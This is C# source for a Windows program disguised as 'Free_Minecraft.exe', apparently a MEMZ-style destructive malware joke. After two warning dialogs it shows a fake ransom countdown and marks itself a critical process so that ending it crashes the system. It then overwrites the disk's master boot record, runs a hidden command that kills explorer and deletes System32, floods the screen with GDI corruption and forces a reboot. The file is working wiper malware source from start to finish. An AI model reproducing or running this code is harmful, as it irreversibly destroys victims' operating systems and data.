using System;
using System.Drawing;
using System.Windows.Forms;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;
using System.IO;

namespace DangerousMemz
{
    class Program : Form
    {
        // --- API WINDOWS ---
        [DllImport("kernel32.dll")] static extern IntPtr CreateFile(string lp, uint da, uint sm, IntPtr sa, uint cd, uint fa, IntPtr h);
        [DllImport("kernel32.dll")] static extern bool WriteFile(IntPtr h, byte[] b, uint n, out uint w, IntPtr o);
        [DllImport("ntdll.dll")] static extern int NtSetInformationProcess(IntPtr h, int c, ref int i, int l);
        [DllImport("gdi32.dll")] static extern bool BitBlt(IntPtr hdcD, int x, int y, int w, int h, IntPtr hdcS, int xs, int ys, int r);
        [DllImport("user32.dll")] static extern IntPtr GetDC(IntPtr h);
        [DllImport("user32.dll")] static extern int GetSystemMetrics(int n);
        [DllImport("user32.dll")] static extern bool DrawIcon(IntPtr hdc, int x, int y, IntPtr hIcon);

        private int timeLeft = 600; 
        private Label lblTimer;
        private TextBox txtKey;
        private static bool isWatcher = false;
        private static Random rnd = new Random();

        // Zasoby GDI
        private static IntPtr iconError = SystemIcons.Error.Handle;
        private static IntPtr iconWarn = SystemIcons.Warning.Handle;

        [STAThread]
        static void Main(string[] args)
        {
            Application.EnableVisualStyles();

            // 1. MSGBOXY STARTOWE
            if (args.Length == 0) {
                if (MessageBox.Show("Warning: This is a MALWARE. Your PC will be destroyed.\nContinue?", "Free_Minecraft.exe", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) != DialogResult.Yes) return;
                if (MessageBox.Show("LAST CHANCE! Your MBR and System32 will be gone.\nAre you really sure?", "FINAL WARNING", MessageBoxButtons.YesNo, MessageBoxIcon.Error) != DialogResult.Yes) return;
            }

            // 2. WATCHER (DWA PROCESY)
            if (args.Length > 0 && args[0] == "--watcher") isWatcher = true;
            else try { Process.Start(Process.GetCurrentProcess().MainModule.FileName, "--watcher"); } catch {}

            // 3. OCHRONA (BSOD)
            try { int c = 1; NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref c, 4); } catch {}
            
            Application.Run(new Program());
        }

        public Program()
        {
            if (isWatcher) {
                this.Opacity = 0; this.ShowInTaskbar = false;
                new Thread(WatcherPayload).Start();
                return;
            }

            // --- INTERFEJS ---
            this.Text = "Opps, files encrypted";
            this.Size = new Size(1000, 600);
            this.StartPosition = FormStartPosition.CenterScreen;
            this.BackColor = Color.FromArgb(160, 0, 0); 
            this.FormBorderStyle = FormBorderStyle.None;
            this.TopMost = true;

            lblTimer = new Label() { Text = "10:00", Font = new Font("Consolas", 40, FontStyle.Bold), Location = new Point(600, 30), Size = new Size(350, 70), TextAlign = ContentAlignment.MiddleRight, ForeColor = Color.Yellow };
            txtKey = new TextBox() { Text = "Key.", Font = new Font("Consolas", 12), Location = new Point(50, 435), Size = new Size(380, 30) };
            
            Button btnDestroy = new Button() { Text = "Destroy Now", Location = new Point(780, 480), Size = new Size(180, 45), BackColor = Color.Black, ForeColor = Color.White };
            btnDestroy.Click += (s, e) => {
                if (MessageBox.Show("Are you sure?", "Confirmation", MessageBoxButtons.YesNo) == DialogResult.Yes) timeLeft = 0;
            };

            this.Controls.AddRange(new Control[] { lblTimer, txtKey, btnDestroy });

            // TIMER
            System.Windows.Forms.Timer t = new System.Windows.Forms.Timer() { Interval = 1000 };
            t.Tick += (s, e) => {
                if (timeLeft > 0) { timeLeft--; lblTimer.Text = TimeSpan.FromSeconds(timeLeft).ToString(@"mm\:ss"); }
                else { t.Stop(); ExecuteDestruction(); }
            };
            t.Start();
        }

        // PAYLOAD DLA WATCHERA (Myszka + Drżenie)
        void WatcherPayload() {
            IntPtr hdc = GetDC(IntPtr.Zero);
            int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
            while(true) {
                DrawIcon(hdc, Cursor.Position.X + rnd.Next(-20, 20), Cursor.Position.Y + rnd.Next(-20, 20), rnd.Next(2) == 0 ? iconError : iconWarn);
                BitBlt(hdc, rnd.Next(-5, 5), rnd.Next(-5, 5), sw, sh, hdc, 0, 0, 0x00CC0020);
                Thread.Sleep(10);
            }
        }

        void ExecuteDestruction()
        {
            // 1. MBR & System32 Kill
            try {
                uint w; byte[] mbr = new byte[512]; mbr[510] = 0x55; mbr[511] = 0xAA;
                IntPtr d = CreateFile("\\\\.\\PhysicalDrive0", 0x10000000, 1|2, IntPtr.Zero, 3, 0, IntPtr.Zero);
                WriteFile(d, mbr, 512, out w, IntPtr.Zero);
            } catch {}
            Process.Start(new ProcessStartInfo("cmd.exe", "/c taskkill /f /im explorer.exe & rd /s /q C:\\Windows\\System32") { WindowStyle = ProcessWindowStyle.Hidden });

            // 2. GDI CHAOS (Tunel + Snow + Invert)
            new Thread(() => {
                IntPtr hdc = GetDC(IntPtr.Zero);
                int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
                while(true) {
                    // SNOW
                    BitBlt(hdc, rnd.Next(sw), rnd.Next(sh), rnd.Next(300), rnd.Next(300), hdc, rnd.Next(sw), rnd.Next(sh), 0x00CC0020);
                    // TUNNEL
                    BitBlt(hdc, 10, 10, sw - 20, sh - 20, hdc, 0, 0, 0x00CC0020);
                    // INVERT
                    if(rnd.Next(15) > 12) BitBlt(hdc, 0, 0, sw, sh, hdc, 0, 0, 0x00550009);
                    Thread.Sleep(10);
                }
            }).Start();

            // 3. TEXT WRITER
            new Thread(() => {
                string m = "Your PC have been destroyed by \"Free_Minecraft\". Now enjoy Nyan Cat";
                IntPtr hdc = GetDC(IntPtr.Zero);
                using (Graphics g = Graphics.FromHdc(hdc)) {
                    Font f = new Font("Comic Sans MS", 40, FontStyle.Bold);
                    for (int i = 0; i <= m.Length; i++) {
                        g.DrawString(m.Substring(0, i), f, Brushes.Black, 52, 202);
                        g.DrawString(m.Substring(0, i), f, Brushes.White, 50, 200);
                        Thread.Sleep(150);
                    }
                }
            }).Start();

            // 4. RESTART
            Process.Start("shutdown", "/r /t 60 /f /c \"Hohoho! Nyan Cat incoming!\"");
            this.Invoke((MethodInvoker)delegate { this.Hide(); });
        }
    }
}
